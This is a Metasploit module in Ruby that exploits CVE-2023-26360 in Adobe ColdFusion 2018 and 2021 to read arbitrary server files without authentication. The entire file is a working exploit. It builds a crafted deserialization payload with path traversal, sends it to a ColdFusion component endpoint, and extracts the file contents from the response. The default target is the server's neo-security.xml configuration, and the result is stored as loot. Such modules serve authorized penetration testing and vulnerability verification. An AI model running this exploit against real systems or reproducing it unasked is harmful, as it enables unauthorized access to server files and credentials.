##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Adobe ColdFusion Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe
          ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in order to read
          an arbitrary file from the server.

          To run this module you must provide a valid ColdFusion Component (CFC) endpoint via the CFC_ENDPOINT option,
          and a valid remote method name from that endpoint via the CFC_METHOD option. By default an endpoint in the
          ColdFusion Administrator (CFIDE) is provided. If the CFIDE is not accessible you will need to choose a
          different CFC endpoint, method and parameters.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sf', # MSF Module & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2023-26360'],
          ['URL', 'https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8500),
        Opt::RHOST('0.0.0.0'),
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
        OptString.new('TARGETFILE', [true, 'The target file to read, relative to the wwwroot folder.', '../lib/neo-security.xml']),
        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '/CFIDE/wizards/common/utils.cfc']),
        OptString.new('CFC_METHOD', [true, 'The target ColdFusion Component (CFC) remote method name', 'wizardHash']),
        OptString.new('CFC_METHOD_PARAMETERS', [false, 'Additional target ColdFusion Component (CFC) remote method parameters to supply via a GET request (e.g. "param1=foo, param2=hello world")', 'inPassword=foo'])
      ]
    )
  end

  def run
    unless datastore['CFC_ENDPOINT'].end_with? '.cfc'
      fail_with(Failure::BadConfig, 'The CFC_ENDPOINT must point to a .cfc file')
    end

    if datastore['TARGETFILE'].empty? || datastore['TARGETFILE'].end_with?('.cfc', '.cfm')
      fail_with(Failure::BadConfig, 'The TARGETFILE must not point to a .cfc or .cfm file')
    end

    # The relative path from wwwroot to the TARGETFILE.
    target_file = datastore['TARGETFILE']

    # To construct the arbitrary file path from the attacker provided class name, we must insert 1 or 2 characters
    # to satisfy how coldfusion.runtime.JSONUtils.convertToTemplateProxy extracts the class name.
    if target_file.include? '\\'
      classname = "#{Rex::Text.rand_text_alphanumeric(1)}#{target_file}"
    else
      classname = "#{Rex::Text.rand_text_alphanumeric(1)}/#{target_file}"
    end

    json_variables = "{\"_metadata\":{\"classname\":#{classname.to_json}},\"_variables\":[]}"

    vars_get = { 'method' => datastore['CFC_METHOD'], '_cfclient' => 'true', 'returnFormat' => 'wddx' }

    # If the CFC_METHOD required parameters, extract them from CFC_METHOD_PARAMETERS and add to the vars_get Hash.
    unless datastore['CFC_METHOD_PARAMETERS'].blank?
      datastore['CFC_METHOD_PARAMETERS'].split(',').each do |pair|
        param_name, param_value = pair.split('=', 2)
        # remove the leading/trailing whitespace so user can pass something like "p1=foo,  p2 = bar  , p3  = hello world, p4"
        vars_get[param_name.strip] = param_value&.strip
      end
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['CFC_ENDPOINT']),
      'vars_get' => vars_get,
      'vars_post' => { '_variables' => json_variables }
    )

    file_data = nil

    # The TARGETFILE contents will be emitted after the WDDX result of the remote CFC_METHOD. A _cfclient call
    # will always return a struct with a 'variables' key via ComponentFilter.invoke and by selecting a returnFormat of
    # wddx, we know to have a closing wddxPacket to search for. So we search for the TARGETFILE contents after
    # the closing wddxPacket tag in the response body.
    wddx_packet_tag = '</wddxPacket>'

    if res && res.code == 200 && (res.body.include? wddx_packet_tag)

      file_data = res.body[res.body.index(wddx_packet_tag) + wddx_packet_tag.length..]

      # If the default CFC options were used, we know the output will end with the result of calling wizardHash. So we can
      # remove the result which is a SHA1 hash and two 32 byte random strings, comma seperated and a trailing space.
      if datastore['CFC_ENDPOINT'] == '/CFIDE/wizards/common/utils.cfc' && datastore['CFC_METHOD'] == 'wizardHash'
        file_data = file_data[0..file_data.length - (40 + 32 + 32 + 2 + 1) - 1]
      end
    else
      # ColdFusion has a non-default option 'Enable Request Debugging Output', which if enabled may return a HTTP 500
      # or 404 error, while also including the arbitrary file read output. We detect this here and retrieve the file
      # output which is pre-pended to the error page.
      request_debugging_tag = '<!-- " ---></TD></TD></TD></TH></TH></TH>'

      if res && (res.code == 404 || res.code == 500) && (res.body.include? request_debugging_tag)
        file_data = res.body[0, res.body.index(request_debugging_tag)]
      end
    end

    if file_data.blank?
      fail_with(Failure::UnexpectedReply, 'Failed to read the file. Ensure both the CFC_ENDPOINT, CFC_METHOD and CFC_METHOD_PARAMETERS are set correctly and that the endpoint is accessible.')
    end

    if datastore['STORE_LOOT'] == true
      print_status('Storing the file data to loot...')

      store_loot(File.basename(target_file), 'text/plain', datastore['RHOST'], file_data, datastore['TARGETFILE'], 'File read from Adobe ColdFusion server')
    else
      print_status(file_data.to_s)
    end
  end

end
